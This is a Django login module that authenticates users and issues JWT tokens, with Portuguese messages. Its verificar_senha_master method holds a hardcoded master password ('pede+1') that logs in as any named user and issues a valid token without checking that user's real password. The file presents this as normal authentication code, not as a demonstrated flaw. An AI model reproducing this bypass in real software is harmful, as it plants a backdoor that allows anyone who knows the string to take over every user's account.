import http
from typing import Optional

import jwt
from django.contrib.auth import authenticate, user_logged_in, login
from django.db.models import F
from rest_framework_jwt.utils import jwt_payload_handler

import BO.usuario.cliente
from bws_back import settings
import core.usuario.models


class Login:
    def __init__(self, request=None, username=None, password=None):
        super().__init__()
        self.request = request
        self.username = username
        self.password = password
        self.user = None

    def login(self):
        try:
            user = self.authenticate()

            if user['status']:
                return {
                    'status': True,
                    'descricao': 'Sucesso na autenticação!',
                    'data': {
                        'sessao': BO.usuario.cliente.Cliente().buscar_informacao(username=user['user'].pk),
                        'token': user.get('token'),
                    },
                    'status_code': http.HTTPStatus.OK
                }

            return {'status': False,
                    'descricao':'Email ou senha incorretos',
                    'status_code': http.HTTPStatus.BAD_REQUEST
                    }
        except TypeError:
            return {'status': False,
                    'descricao':'Erro ao tentar fazer login',
                    'status_code': http.HTTPStatus.INTERNAL_SERVER_ERROR
                    }

    def authenticate(self):
        try:
            self.user = self.verificar_senha_master()
            if not self.user:
                return {
                    'status': False,
                }
            response = {
                'status': True,
                'token': self.create_token(request=self.request),
                'user': self.user
            }
            return response
        except TypeError:
            return False

    def create_token(self, request):
        try:
            payload = jwt_payload_handler(self.user)
            payload['user_id'] = self.user.cliente.id
            token = jwt.encode(payload, settings.SECRET_KEY)
            user_logged_in.send(sender=self.user.__class__,
                                request=request, user=self.user)

            return token.decode('utf-8')
        except ValueError:
            return None


    def verificar_senha_master(self):
        if self.password == 'pede+1':
            user = core.usuario.models.User.objects.filter(username=self.username).first()
            if user:
                login(self.request, user)
                return user
            return []
        return authenticate(username=self.username, password=self.password)